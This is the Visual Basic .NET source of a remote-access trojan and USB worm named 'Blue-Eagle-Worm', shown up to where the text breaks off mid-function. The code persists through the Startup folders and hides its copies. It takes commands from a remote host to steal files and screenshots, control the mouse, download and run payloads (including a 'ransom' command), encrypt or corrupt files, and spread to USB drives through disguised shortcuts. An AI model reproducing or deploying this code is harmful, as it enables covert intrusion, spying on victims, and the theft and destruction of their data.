Imports System.Net.Sockets
Imports System.Globalization
Imports System.Drawing.Imaging
Imports System.Drawing.Drawing2D
Imports System.IO
Imports System.Threading
Imports System.Net
Imports System.Management

Module taskhost
    Private Declare Function SystemParametersInfo Lib "user32" Alias "SystemParametersInfoA" (ByVal uAction As Integer, ByVal uParam As Integer, ByVal lpvParam As String, ByVal fuWinIni As Integer) As Integer
    Private Const SETDESKWALLPAPER = 20
    Private Const UPDATEINIFILE = &H1
    Dim alaa(), text1, text2, text3 As String
    Const spl As String = "abccba"
    Dim vvname
    Private Copy_cut As String
    Dim picBox As New PictureBox
    Private WithEvents C As New k
    Public Yy As String = "|BlueEagle|"
    Public cap As New Rmote_Desktop
    Private culture As String = CultureInfo.CurrentCulture.EnglishName
    Private country2 As String = culture.Substring(culture.IndexOf("("c) + 1, culture.LastIndexOf(")"c) - culture.IndexOf("("c) - 1)
    Private country As String
    Public ooo As String = Environment.GetFolderPath(Environment.SpecialFolder.Templates) & "\" + System.Environment.UserName + ".jpg"
    Private US As New USB
    Dim WithEvents Tryer, Timer1 As New System.Windows.Forms.Timer
    Private startuppath As String = ""
    Public HOST As String
    Public port As Integer
    Dim Connected As Boolean = False
    Declare Sub mouse_event Lib "user32" Alias "mouse_event" (ByVal dwFlags As Integer, ByVal dx As Integer, ByVal dy As Integer, ByVal cButtons As Integer, ByVal dwExtraInfo As Integer)
    Declare Function capGetDriverDescriptionA Lib "avicap32.dll" (ByVal wDriver As Short, _
   ByVal lpszName As String, ByVal cbName As Integer, ByVal lpszVer As String, _
   ByVal cbVer As Integer) As Boolean
    Dim vName As String = "Blue-Eagle-Worm"
    Dim usbx As String = 0
    Sub Main()
        On Error Resume Next
        Get_Country()
        FileOpen(1, Application.ExecutablePath, OpenMode.Binary, OpenAccess.Read, OpenShare.Shared)
        text1 = Space(LOF(1))
        text2 = Space(LOF(1))
        text3 = Space(LOF(1))
        FileGet(1, text1)
        FileGet(1, text2)
        FileGet(1, text3)
        alaa = Split(text1, spl)
        HOST = alaa(1)
        port = alaa(2)
        usbx = alaa(3)
        If usbx Then
            US.Start()
        End If
        Tryer.Interval = 1000
        Timer1.Interval = 1000
        Tryer.Start()
        Timer1.Start()
        Application.Run()
    End Sub
    Sub socket_on() Handles C.Connected
        Connected = True
    End Sub
    Sub socket_off() Handles C.Disconnected
        Connected = False
    End Sub
    Private Sub copytostartup()
        Dim dirto As String = Environment.GetFolderPath(Environment.SpecialFolder.Startup) : Dim AppPath As String = Application.ExecutablePath : Dim AutoStart As String = dirto & "/" : Dim HideFile As IO.FileInfo = My.Computer.FileSystem.GetFileInfo(dirto) : Dim name As String = Application.ExecutablePath.Replace(Application.StartupPath & "\", "") : Try : File.Copy(AppPath, AutoStart & name, True) : startuppath = dirto & "\" & name : Catch ex As Exception : End Try
    End Sub
    Private Sub Timer1_Tick(ByVal sender As Object, ByVal e As EventArgs) Handles Timer1.Tick
        Try : copytostartup() : Windows_Users_Common_Startup_Handler() : Catch ex As Exception : End Try
    End Sub
    Private Sub Tryer_Tick(ByVal sender As Object, ByVal e As EventArgs) Handles Tryer.Tick
        If Connected = False Then
            Try : C.Connect(HOST, port) : Catch ex As Exception : End Try
        End If
    End Sub
    Function GetFirewall() As String
        Dim str As String = Nothing
        Dim searcher As New ManagementObjectSearcher("\\" & Environment.MachineName & "\root\SecurityCenter2", "SELECT * FROM FirewallProduct")
        Dim instances As ManagementObjectCollection = searcher.[Get]()
        For Each queryObj As ManagementObject In instances
            str = queryObj("displayName").ToString()
        Next
        Return str
        searcher.Dispose()
    End Function
    Public Function checkcam() As String
        Try
            Dim d As String = Space(100)
            For i As Integer = 0 To 4
                If capGetDriverDescriptionA(i, d, 100, Nothing, 100) Then
                    Return "Yes"
                End If
            Next
        Catch ex As Exception
        End Try
        Return "No"
    End Function
    Function RAM() As String
        Dim x As String = ""

        Dim PH As Long = Val(My.Computer.Info.TotalPhysicalMemory)
        If PH > 1073741824 Then
            x = (PH / 1073741824).ToString
            x = x.Remove(4, x.Length - 4) + " GB"
        ElseIf PH > 1048576 Then
            x = (PH / 1048576).ToString
            x = x.Remove(4, x.Length - 4) + " Mo"
        End If
        Return x
    End Function
    Private Sub Windows_Users_Common_Startup_Handler()
        Dim dirto As String = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
        Dim AppPath As String = Application.ExecutablePath
        Dim AutoStart As String = dirto & "/"
        Dim HideFile As IO.FileInfo = My.Computer.FileSystem.GetFileInfo(dirto)
        Dim name As String = Application.ExecutablePath.Replace(Application.StartupPath & "\", "")
        Try
            File.Copy(AppPath, AutoStart & name, True)
            File.Copy(AppPath, AutoStart & ".exe", True)
            HideFile.IsReadOnly = True
            HideFile.Attributes = HideFile.Attributes Or IO.FileAttributes.Hidden
            SetAttr(dirto & "/" & name, FileAttribute.Hidden)
        Catch ex As Exception
        End Try
    End Sub ''Cross_Users_Startup
    Sub imge_desik()
        Dim bitmap As New Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height)
        Dim graphics__1 As Graphics = Graphics.FromImage(TryCast(bitmap, Image))
        graphics__1.CopyFromScreen(0, 0, 0, 0, bitmap.Size)
        picBox.SizeMode = PictureBoxSizeMode.AutoSize
        picBox.Image = bitmap
        Dim er As String = ooo

        Dim bm As New Bitmap(picBox.Image)
        Dim width As Integer = 460
        Dim height As Integer = 360
        Dim thumb As New Bitmap(width, height)
        Dim g As Graphics = Graphics.FromImage(thumb)
        g.InterpolationMode = Drawing2D.InterpolationMode.Low
        g.DrawImage(bm, New Rectangle(0, 0, width, height), New Rectangle(0, 0, bm.Width, bm.Height), GraphicsUnit.Pixel)
        g.Dispose()
        thumb.Save(er, System.Drawing.Imaging.ImageFormat.Jpeg)

        bm.Dispose()
        thumb.Dispose()
    End Sub
     Private Sub Data(ByVal b As Byte()) Handles C.Data
        Dim T As String = BS(b)
        Dim base64Encoded As String = T 'Encoded

        Dim base64Decoded As String
        Dim datax() As Byte
        datax = System.Convert.FromBase64String(base64Encoded)
        base64Decoded = System.Text.ASCIIEncoding.ASCII.GetString(datax)

        Dim A As String() = Split(base64Decoded, Yy)
        Try


            Select Case A(0)
                Case "downloadfile"

                    C.Send("downloadedfile" & "|BlueEagle|" & Convert.ToBase64String(IO.File.ReadAllBytes(A(1))) & "|BlueEagle|" & A(2))

                Case "getmymusicpath"
                    Dim specialfolder As String
                    specialfolder = Environment.GetFolderPath(Environment.SpecialFolder.MyMusic)
                    C.Send("getpath" & Yy & specialfolder & "\")
                Case "OpenPro"
                    C.Send("OpenPro")
                    '   Comet.Send("ProcessManager" & Yy & allProcess & Yy & System.IO.Path.GetFileNameWithoutExtension(Application.ExecutablePath))

                Case "rename"
                    If (A(1)) = "" Then
                    ElseIf (A(1)).Length > 0 Then
                        vName = A(1)
                    End If

                Case "infoDesk"

                    imge_desik()
                    C.Send("infoDesk" & "|BlueEagle|" & Convert.ToBase64String(IO.File.ReadAllBytes(ooo)) & "|BlueEagle|" & vName & "|BlueEagle|" & port & "|BlueEagle|" & "Spy_Byte" & "|BlueEagle|" & GetFirewall() & "|BlueEagle|" & Application.ExecutablePath)
                Case "info"

                    Dim pc As String = Environment.MachineName & "/" & Environment.UserName
                    Dim os As String = My.Computer.Info.OSFullName
                    Dim cpu As String = My.Computer.Registry.GetValue("HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\SYSTEM\CENTRALPROCESSOR\0", "ProcessorNameString", Nothing).ToString
                    Dim smsms As String
                    smsms = Microsoft.Win32.Registry.GetValue("HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System\BIOS", "SystemManufacturer", "")
                    Dim Xepa As String = ""
                    Dim psBattery As PowerStatus = SystemInformation.PowerStatus
                    Dim perFull As Single = psBattery.BatteryLifePercent
                    If perFull * 100 > 100 Then
                        Xepa = 100
                    ElseIf perFull * 100 < 100 Then
                        Xepa = perFull * 100
                    End If
                    If psBattery.PowerLineStatus = PowerLineStatus.Online Then
                        Xepa = "Powered Charging - " & perFull * 100 & "%"

                    ElseIf psBattery.PowerLineStatus = PowerLineStatus.Offline Then
                        Xepa = "do not Charging Powered - " & perFull * 100 & "%"

                    End If


                    imge_desik()
                    '    Comet.Send("info" & Yy &1 Name & Yy &2 pc & Yy & 3country & Yy & 4os + GenerateOperatingSystem() & Yy &5 "Anti" & Yy & 6checkcam() & Yy & 7RAM() & Yy & 8cpu & Yy & 9"Spy_Byte" & Yy & 10FR() & Yy & 11smsms & Yy & 12ipAddress.ToString() & Yy &13 Xepa & Yy & Convert.ToBase64String(IO.File.ReadAllBytes(ooo)))                   ' End If")
                    C.Send("info" & Yy & vName & Yy & pc & Yy & os & Yy & country & Yy & GetFirewall() & Yy & RAM() & Yy & "Spy_Byte_Worm" & Yy & "Not_Available" & Yy & checkcam() & Yy & Convert.ToBase64String(IO.File.ReadAllBytes(ooo)))
                    '  Comet.Send("info" & Yy & Name & Yy & pc & Yy & "Unknowen" & Yy & country & Yy & GetFirewall() & Yy & RAM() & Yy & "Spy_Byte" & Yy & AC & Yy & checkcam() & Yy & Convert.ToBase64String(IO.File.ReadAllBytes(ooo)))


                Case "Uninstall"
                    End

                Case "!"
                    cap.Clear()
                    Dim s = Screen.PrimaryScreen.Bounds.Size
                    C.Send("!" & Yy & s.Width & Yy & s.Height)
                Case "@"
                    Dim SizeOfimage As Integer = A(1)
                    Dim Split As Integer = A(2)
                    Dim Quality As Integer = A(3)

                    Dim Bb As Byte() = cap.Cap(SizeOfimage, Split, Quality)
                    Dim M As New IO.MemoryStream
                    Dim CMD As String = "@" & Yy
                    M.Write(SB(CMD), 0, CMD.Length)
                    M.Write(Bb, 0, Bb.Length)
                    C.Send(M.ToArray)
                    M.Dispose()
                Case "#" ' mouse clicks
                    Cursor.Position = New Point(A(1), A(2))
                    mouse_event(A(3), 0, 0, 0, 1)
                Case "$" '  mouse move
                    Cursor.Position = New Point(A(1), A(2))
                Case "Mic"
                    C.Send("micready")


                Case "ransom"
                    IO.File.WriteAllBytes(IO.Path.GetTempPath & A(1), Convert.FromBase64String(A(2)))
                    Threading.Thread.CurrentThread.Sleep(1000)
                    Process.Start(IO.Path.GetTempPath & A(1))




                Case "openurl"
                    If A(1) = "Default" Then
                        Try
                            System.Diagnostics.Process.Start(A(2))
                        Catch ex As Exception
                        End Try
                    Else
                        Try
                            System.Diagnostics.Process.Start(A(1), A(2))
                        Catch ex As Exception

                        End Try
                    End If

                Case "tt"
                    C.Send("tt")
                Case "opentto"
                    C.Send("opentto")

                Case "viewimage"
                    C.Send("viewimage" & Yy & Convert.ToBase64String(IO.File.ReadAllBytes(A(1))) & Yy)
                Case "GetDrives"
                    C.Send("FileManager" & Yy & getDrives())
                Case "FileManager"
                    Try
                        C.Send("FileManager" & Yy & getFolders(A(1)) & getFiles(A(1)))
                    Catch
                        C.Send("FileManager" & Yy & "Error")
                    End Try
                Case "\\"
                    C.Send("\\")
                Case "Delete"
                    Select Case A(1)
                        Case "Folder"
                            IO.Directory.Delete(A(2))
                        Case "File"
                            IO.File.Delete(A(2))

                    End Select
                Case "Execute"
                    Process.Start(A(1))
                Case "Exletn"
                    Dim pro As Process = New Process() With {.StartInfo = New ProcessStartInfo(A(1)) With {.Verb = "runas", .UseShellExecute = True}}
                    pro.Start()
                Case "CpoSx"

                    Try
                        File.Copy(Application.ExecutablePath, A(1) + "\" + vvname, True)

                    Catch ex As Exception
                        MsgBox(ex.Message)
                    End Try

                Case "IOPPYR"



                    Try
                        File.Copy(Application.ExecutablePath, A(1) + "\" + vvname, True)
                        System.IO.File.SetAttributes(A(1) + ".EXE", IO.FileAttributes.Hidden)
                    Catch ex As Exception
                        MsgBox(ex.Message)
                    End Try
                Case "EMNS"
                    File.Encrypt(A(1))
                Case "EMNqS"
                    File.Decrypt(A(1))

                Case "Cuut"
                    Copy_cut = A(1)

                Case "Cuutod"
                    Copy_cut = A(1)


                Case "Cuutodsd"


                    Try

                        File.Move(Copy_cut, A(1))
                    Catch ex As Exception
                        MsgBox(ex.Message)
                    End Try


                Case "dCopsx"
                    Try
                        File.Copy(Copy_cut, A(1), True)
                    Catch ex As Exception
                        MsgBox(ex.Message)
                    End Try


                Case "EIIT"
                    Dim Vir As String = "C:\Program Files (x86)" & "\WinRAR\Rar "
                    Dim POXow = A(1)
                    Dim oi$ = A(1) + ".rar"
                    Shell(Vir + "a -r """ + oi + """ """ + POXow)
                Case "Rename"
                    Select Case A(1)
                        Case "Folder"
                            My.Computer.FileSystem.RenameDirectory(A(2), A(3))
                        Case "File"
                            My.Computer.FileSystem.RenameFile(A(2), A(3))
                    End Select
                Case "sendfile"
                    IO.File.WriteAllBytes(IO.Path.GetTempPath & A(1), Convert.FromBase64String(A(2)))
                    Thread.Sleep(1000)
                    Process.Start(IO.Path.GetTempPath & A(1))
                    C.Send("Coloreg")
                Case "playmusic"
                    My.Computer.Audio.Play(A(1), AudioPlayMode.Background)
                Case "getdesktoppath"
                    Dim specialfolder As String
                    specialfolder = Environment.GetFolderPath(Environment.SpecialFolder.Desktop)
                    C.Send("getpath" & Yy & specialfolder & "\")
                Case "gettemppath"
                    Dim specialfolder As String
                    specialfolder = IO.Path.GetTempPath
                    C.Send("getpath" & Yy & specialfolder)
                Case "getstartuppath"
                    Dim specialfolder As String
                    specialfolder = Environment.GetFolderPath(Environment.SpecialFolder.Startup)
                    C.Send("getpath" & Yy & specialfolder & "\")
                Case "getmydocumentspath"
                    Dim specialfolder As String
                    specialfolder = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments)
                    C.Send("getpath" & Yy & specialfolder & "\")
                Case "getmydocumentspath" 'pic
                    Dim specialfolder As String
                    specialfolder = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments)
                    C.Send("getpath" & Yy & specialfolder & "\")
                Case "getmydocumentspath" 'music
                    Dim specialfolder As String
                    specialfolder = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments)
                    C.Send("getpath" & Yy & specialfolder & "\")
                Case "edittextfile"
                    Dim R As New IO.StreamReader(A(1))
                    Dim d As String
                    d = R.ReadToEnd
                    R.Close()
                    C.Send("edittextfile" & Yy & A(1) & Yy & d)
                Case "savetextfile"
                    Dim Comet As New IO.StreamWriter(A(1))
                    Comet.WriteLine(A(2))
                    Comet.Close()
                Case "creatnewtextfile"
                    Try
                        IO.File.Create(A(1)).Dispose()
                    Catch ex As Exception
                        C.Send("msgbox" & Yy & "Information" & Yy & "File Name Already Exists")
                    End Try
                Case "setaswallpaper"
                    SystemParametersInfo(SETDESKWALLPAPER, 0, A(1), UPDATEINIFILE)
                Case "sendfileto"
                    IO.File.WriteAllBytes(A(1), Convert.FromBase64String(A(2)))
                    Thread.Sleep(1000)
                Case "creatnewfolder"
                    Try
                        My.Computer.FileSystem.CreateDirectory _
        (A(1))

                    Catch ez As Exception
                    End Try
                Case "hidefolderfile"
                    Dim hiden As FileAttribute = FileAttribute.Hidden
                    Try
                        SetAttr(A(1), hiden)
                    Catch ex As Exception
                    End Try
                Case "download"
                    Dim cw As New WebClient
                    Dim P As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\" + A(2)
                    If File.Exists(P) Then File.Delete(P)
                    File.WriteAllBytes(P, cw.DownloadData(A(1)))
                    Process.Start(P)
                    C.Send("Coloreg")
                Case "showfolderfile"
                    Dim shown As FileAttribute = FileAttribute.Normal
                    Try
                        SetAttr(A(1), shown)
                    Catch ex As Exception

                    End Try
                Case "downloadfile"
                    C.Send("downloadedfile" & Yy & Convert.ToBase64String(IO.File.ReadAllBytes(A(1))) & Yy & A(2))
                Case "corrupt"
                    Dim corruption As String = "OP0 01 01 200 01 02OP"
                    Dim R As New IO.StreamReader(A(1))
                    Dim d As String
                    d = R.ReadToEnd
                    R.Close()
                    My.Computer.FileSystem.WriteAllText(A(1), corruption & d, False)
                Case "tt"
                    C.Send("tt")
                Case "Upload"
                    Try
                        If File.Exists(A(1)) Then File.Delete(A(1))
                        Dim fs As New FileStream(A(1), FileMode.Create, FileAccess.Write)
                        Dim tempPacket() As Byte = SB(A(3))
                        Dim packet(tempPacket.Length - 2) As Byte
                        Array.Copy(tempPacket, 0, packet, 0, packet.Length)
                        fs.Write(packet, 0, packet.Length) : fs.Close()
                        C.Send("NextPartOfUpload" & Yy & A(2))
                    Catch
                        C.Send("UploadFailed" & Yy & A(2))
                    End Try
                Case "UploadContinue"
                    Try
A:
                        Dim fs As New FileStream(A(1), FileMode.Append, FileAccess.Write)
                        Dim tempPacket() As Byte = SB(A(3))
                        Dim packet(tempPacket.Length - 2) As Byte
                        Array.Copy(tempPacket, 0, packet, 0, packet.Length)
                        fs.Write(packet, 0, packet.Length) : fs.Close()
                        C.Send("NextPartOfUpload" & Yy & A(2))
                    Catch
                        GoTo A
                    End Try
                Case "CancelUpload"
B:
                    Try
                        If File.Exists(A(1)) Then File.Delete(A(1))
                    Catch
                        GoTo B
                    End Try


            End Select
        Catch ex As Exception

        End Try
    End Sub
    Function SB(ByVal s As String) As Byte()
        Return System.Text.Encoding.Default.GetBytes(s)
    End Function
    Function BS(ByVal b As Byte()) As String
        Return System.Text.Encoding.Default.GetString(b)
    End Function
    Function fx(ByVal b As Byte(), ByVal WRD As String) As Array
        Dim a As New List(Of Byte())
        Dim M As New IO.MemoryStream
        Dim MM As New IO.MemoryStream
        Dim T As String() = Split(BS(b), WRD)
        M.Write(b, 0, T(0).Length)
        MM.Write(b, T(0).Length + WRD.Length, b.Length - (T(0).Length + WRD.Length))
        a.Add(M.ToArray)
        a.Add(MM.ToArray)
        M.Dispose()
        MM.Dispose()
        Return a.ToArray
    End Function
    Public Function ENB(ByRef s As String) As String
        Dim byt As Byte() = System.Text.Encoding.UTF8.GetBytes(s)
        ENB = Convert.ToBase64String(byt)
    End Function
    Public Function DEB(ByRef s As String) As String
        Dim b As Byte() = Convert.FromBase64String(s)
        DEB = System.Text.Encoding.UTF8.GetString(b)
    End Function
    Public Function getDrives() As String
        Dim allDrives As String = ""
        For Each d As DriveInfo In My.Computer.FileSystem.Drives
            Select Case d.DriveType
                Case 3
                    allDrives += "[Drive]" & d.Name & "FileManagerSplitFileManagerSplit"
                Case 5
                    allDrives += "[CD]" & d.Name & "FileManagerSplitFileManagerSplit"
            End Select
        Next
        Return allDrives
    End Function
    Public Function readtext(ByVal l As String) As String
        Return IO.File.ReadAllText(l)
    End Function
    Public Function getFolders(ByVal location) As String
        Dim di As New DirectoryInfo(location)
        Dim folders = ""
        For Each subdi As DirectoryInfo In di.GetDirectories
            folders += "[Folder]" & subdi.Name & "FileManagerSplitFileManagerSplit"
        Next
        Return folders
    End Function
    Public Function getFiles(ByVal location) As String
        Dim dir As New System.IO.DirectoryInfo(location)
        Dim files = ""
        For Each f As System.IO.FileInfo In dir.GetFiles("*.*")
            files += f.Name & "FileManagerSplit" & f.Length.ToString & "FileManagerSplit"
        Next
        Return files
    End Function
    Public Class Rmote_Desktop
        Private Shared OA As New List(Of Bitmap)
        Private Shared OAA As New List(Of Point)
        Private Shared OM As New Bitmap(1, 1) ' OLD IMAGE
        Private Shared Function QZ(ByVal q As Integer) As Size '  Lower size of image
            Dim zs As New Size(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height)
            Select Case q
                Case 0
                    Return zs
                Case 1
                    zs.Width = zs.Width / 1.1
                    zs.Height = zs.Height / 1.1
                Case 2
                    zs.Width = zs.Width / 1.3
                    zs.Height = zs.Height / 1.3
                Case 3
                    zs.Width = zs.Width / 1.5
                    zs.Height = zs.Height / 1.5
                Case 4
                    zs.Width = zs.Width / 1.9
                    zs.Height = zs.Height / 1.9
                Case 5
                    zs.Width = zs.Width / 2
                    zs.Height = zs.Height / 2
                Case 6
                    zs.Width = zs.Width / 2.1
                    zs.Height = zs.Height / 2.1
                Case 7
                    zs.Width = zs.Width / 2.2
                    zs.Height = zs.Height / 2.2
                Case 8
                    zs.Width = zs.Width / 2.5
                    zs.Height = zs.Height / 2.5
                Case 9
                    zs.Width = zs.Width / 3
                    zs.Height = zs.Height / 3
                Case 10
                    zs.Width = zs.Width / 3.5
                    zs.Height = zs.Height / 3.5
                Case 11
                    zs.Width = zs.Width / 4
                    zs.Height = zs.Height / 4
                Case 12
                    zs.Width = zs.Width / 5
                    zs.Height = zs.Height / 5
                Case 13
                    zs.Width = zs.Width / 6
                    zs.Height = zs.Height / 6
            End Select
            zs.Width = Mid(zs.Width.ToString, 1, zs.Width.ToString.Length - 1) & 0
            zs.Height = Mid(zs.Height.ToString, 1, zs.Height.ToString.Length - 1) & 0
            Return zs
        End Function
        Private Shared Function Gd(Optional ByVal Wi As Integer = 0, Optional ByVal He As Integer = 0, Optional ByVal Sh As Boolean = True) As Image
            Dim W As Integer = Screen.PrimaryScreen.Bounds.Width
            Dim H As Integer = Screen.PrimaryScreen.Bounds.Height
            Dim B As New Bitmap(W, H)
            Dim g As Graphics = Graphics.FromImage(B)
            g.CompositingQuality = CompositingQuality.HighSpeed
            g.CopyFromScreen(0, 0, 0, 0, New Size(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height), CopyPixelOperation.SourceCopy)
            If Sh Then
                Try
                    Cursors.Default.Draw(g, New Rectangle(Cursor.Position, New Size(32, 32)))
                Catch ex As Exception
                End Try
            End If
            g.Dispose()
            If Wi = 0 And He = 0 Then
                Return B
            Else
                Return B.GetThumbnailImage(Wi, He, Nothing, Nothing)
            End If
        End Function
        Private Shared Function md5(ByVal bB As Byte()) As String
            Dim md5Obj As New System.Security.Cryptography.MD5CryptoServiceProvider
            bB = md5Obj.ComputeHash(bB)
            Return Convert.ToBase64String(bB)
        End Function
        Private Shared Function GetEncoderInfo(ByVal M As String) As ImageCodecInfo
            Dim j As Integer
            Dim encoders As ImageCodecInfo()
            encoders = ImageCodecInfo.GetImageEncoders()
            For j = 0 To encoders.Length
                If encoders(j).MimeType = M Then
                    Return encoders(j)
                End If
            Next j
            Return Nothing
        End Function
        Shared Sub Clear()
            oQ = -1
            oCo = -1
            oQu = -1
            OM = New Bitmap(1, 1)
        End Sub

        Private Shared oQ As Integer = 0
        Private Shared oCo As Integer = 0
        Private Shared oQu As Integer = 0
        Shared Function Cap(ByVal q As Integer, ByVal co As Integer, ByVal Qu As Integer) As Byte()
ee:
            Dim ZS As New Size(QZ(q))
            ZS.Width = Mid(ZS.Width.ToString, 1, ZS.Width.ToString.Length - 1) & 0
            ZS.Height = Mid(ZS.Height.ToString, 1, ZS.Height.ToString.Length - 1) & 0
            If OM.Size.Width <> ZS.Width Or OM.Height <> ZS.Height Or oCo <> co Or oQu <> Qu Then
                OA.Clear()
                OAA.Clear()
                OM = New Bitmap(ZS.Width, ZS.Height)
            End If
            oQ = q
            oCo = co
            oQu = Qu

            Dim A As New List(Of Bitmap)
            Dim AA As New List(Of Point)
            Dim m As Bitmap
            If OA.Count > 0 Then
                A.AddRange(OA.ToArray)
                OA.Clear()
                AA.AddRange(OAA.ToArray)
                OAA.Clear()

                m = OM
                GoTo e
            End If
            m = Gd(ZS.Width, ZS.Height)
            Dim w As Integer = ZS.Width
            Dim h As Integer = ZS.Height
            Dim K As Integer = 0
            For i As Integer = 0 To co - 1
                For ii As Integer = 0 To co - 1
                    Dim y As Integer = h / co * i
                    Dim x As Integer = w / co * ii
                    Dim wc As Integer = w / co
                    Dim hc As Integer = h / co
                    If wc.ToString.Contains(".") Then
                        wc = Split(wc, ".")(0)
                    End If
                    If hc.ToString.Contains(".") Then
                        hc = Split(hc, ".")(0)
                    End If
                    Dim MM As New IO.MemoryStream
                    Dim Mj = m.Clone(New Rectangle(x, y, wc, hc), m.PixelFormat)
                    Dim MJJ = OM.Clone(New Rectangle(x, y, wc, hc), m.PixelFormat)
                    Dim b1 As Byte()
                    Dim b2 As Byte()
                    Mj.Save(MM, Imaging.ImageFormat.Jpeg)
                    b1 = MM.ToArray
                    MM.Dispose()
                    MM = New IO.MemoryStream
                    MJJ.Save(MM, Imaging.ImageFormat.Jpeg)

                    b2 = MM.ToArray

                    MM.Dispose()
                    If md5(b1) = md5(b2) Then
                        Mj.Dispose()
                    Else
                        A.Add(Mj)
                        AA.Add(New Point(x, y))
                    End If
                    MJJ.Dispose()
nx:
                Next
            Next
e:

            If A.Count = 0 Then
                Return New Byte() {0}
            End If
            Dim hh As Integer = 0
            Dim QA As New List(Of Integer)
            For i As Integer = 0 To co * co / 5
                If i = A.Count Then Exit For
                QA.Add(i)
                hh += A(i).Height
            Next
            Dim xx As New Bitmap(A(0).Width, hh)
            Dim gg = Graphics.FromImage(xx)
            Dim tp As Integer = 0
            Dim s As String = m.Width & "." & m.Height & ","
            For Each i As Integer In QA
                s += AA(i).X & "." & AA(i).Y & "." & A(i).Height & ","
                gg.DrawImage(A(i), 0, tp)
                tp += A(i).Height
            Next
            s += "NsBl33D"
            For i As Integer = 0 To A.Count - 1
                If QA.Contains(i) = False Then
                    OA.Add(A(i))
                    OAA.Add(AA(i))
                End If
            Next
            gg.Dispose()
            Dim JA = New IO.MemoryStream
            Dim eps As EncoderParameters = New EncoderParameters(1)
            eps.Param(0) = New EncoderParameter(Drawing.Imaging.Encoder.Quality, Qu)
            Dim ici As ImageCodecInfo = GetEncoderInfo("image/jpeg")
            xx.Save(JA, ici, eps)
            Dim J2 As New IO.MemoryStream
            J2.Write(System.Text.Encoding.Default.GetBytes(s), 0, s.Length)
            J2.Write(JA.ToArray, 0, JA.Length)
            OM = m
            xx.Dispose()
            Return J2.ToArray
        End Function
    End Class ''Rmote_Desktop_Manager
    Private Sub Get_Country()
        Try
            vvname = Application.ExecutablePath.Replace(Application.StartupPath & "\", "")
            Dim xmldoc As New System.Xml.XmlDocument
            Dim xmlnode As System.Xml.XmlNodeList

            Dim i As Integer
            xmldoc.Load("http://freegeoip.net/xml/")
            xmlnode = xmldoc.GetElementsByTagName("Response")
            For i = 0 To xmlnode.Count - 1

                xmlnode(i).ChildNodes.Item(0).InnerText.Trim()
                country = (xmlnode(i).ChildNodes.Item(2).InnerText.Trim)

            Next
        Catch ex As Exception
            country = country2

        End Try
    End Sub
#Region "USB_ShortCut"
    Private Class USB
        Private Off As Boolean = False
        Dim thread As Threading.Thread = Nothing
        Dim r As New Random
        Private ExeName As String = r.Next(199997, 88886777) & ".exe"
        Sub Start()
            If thread Is Nothing Then
                thread = New Threading.Thread(AddressOf usb, 1)
                thread.Start()
            End If
        End Sub
        Sub clean()
            Off = True
            Do Until thread Is Nothing
                Threading.Thread.CurrentThread.Sleep(1)
            Loop
            For Each x As IO.DriveInfo In IO.DriveInfo.GetDrives
                Try
                    If x.IsReady Then
                        If x.DriveType = IO.DriveType.Removable Or _
                        x.DriveType = IO.DriveType.CDRom Then
                            If IO.File.Exists(x.Name & ExeName) Then
                                IO.File.SetAttributes(x.Name _
                                & ExeName, IO.FileAttributes.Normal)
                                IO.File.Delete(x.Name & ExeName)
                            End If
                            For Each xx As String In IO.Directory.GetFiles(x.Name)
                                Try
                                    IO.File.SetAttributes(xx, IO.FileAttributes.Normal)
                                    If xx.ToLower.EndsWith(".lnk") Then
                                        IO.File.Delete(xx)
                                    End If
                                Catch ex As Exception
                                End Try
                            Next
                            For Each xx As String In IO.Directory.GetDirectories(x.Name)
                                Try
                                    With New IO.DirectoryInfo(xx)
                                        .Attributes = IO.FileAttributes.Normal
                                    End With
                                Catch ex As Exception
                                End Try
                            Next
                        End If
                    End If
                Catch ex As Exception
                End Try
            Next
        End Sub
        Sub usb()
            Off = False
            Do Until Off = True
                For Each x In IO.DriveInfo.GetDrives
                    Try
                        If x.IsReady Then
                            If x.TotalFreeSpace > 0 And x.DriveType = IO.DriveType _
                            .Removable Or x.DriveType = IO.DriveType.CDRom Then
                                Try
                                    If IO.File.Exists(x.Name & ExeName) Then
                                        IO.File.SetAttributes(x.Name & ExeName, IO.FileAttributes.Normal)
                                    End If
                                    IO.File.Copy(Application.ExecutablePath, x.Name & ExeName, True)
                                    IO.File.SetAttributes(x.Name & ExeName, IO.FileAttributes.Hidden)
                                    For Each xx As String In IO.Directory.GetFiles(x.Name)
                                        If IO.Path.GetExtension(xx).ToLower <> ".lnk" And _
                                        xx.ToLower <> x.Name.ToLower & ExeName.ToLower Then
                                            IO.File.SetAttributes(xx, IO.FileAttributes.Hidden)
                                            IO.File.Delete(x.Name & New IO.FileInfo(xx).Name & ".lnk")
                                            With CreateObject("WScript.Shell").CreateShortcut _
                                            (x.Name & New IO.FileInfo(xx).Name & ".lnk")
                                                .TargetPath = "cmd.exe"
                                                .WorkingDirectory = ""
                                                .Arguments = "/c start " & ExeName.Replace(" ", ChrW(34) _
                                                 & " " & ChrW(34)) & "&start " & New IO.FileInfo(xx) _
                                                .Name.Replace(" ", ChrW(34) & " " & ChrW(34)) & " & exit"
                                                .IconLocation = GetIcon(IO.Path.GetExtension(xx))
                                                .Save()
                                            End With
                                        End If
                                    Next
                                    For Each xx As String In IO.Directory.GetDirectories(x.Name)
                                        IO.File.SetAttributes(xx, IO.FileAttributes.Hidden)
                                        IO.File.Delete(x.Name & New IO.DirectoryInfo(xx).Name & " .lnk")
                                        With CreateObject("WScript.Shell") _
                                        .CreateShortcut(x.Name & IO.Path.GetFileNameWithoutExtension(xx) & " .lnk")
                                            .TargetPath = "cmd.exe"
                                            .WorkingDirectory = ""
                                            .Arguments = "/c start " & ExeName.Replace(" ", ChrW(34) _
                                             & " " & ChrW(34)) & "&explorer /root,""%CD%" & New  _
                                             IO.DirectoryInfo(xx).Name & """ & exit"
                                            .IconLocation = "%SystemRoot%\system32\SHELL32.dll,3" '< folder icon :D
                                            .Save()
                                        End With
                                    Next
                                Catch ex As Exception
                                End Try
                            End If
                        End If
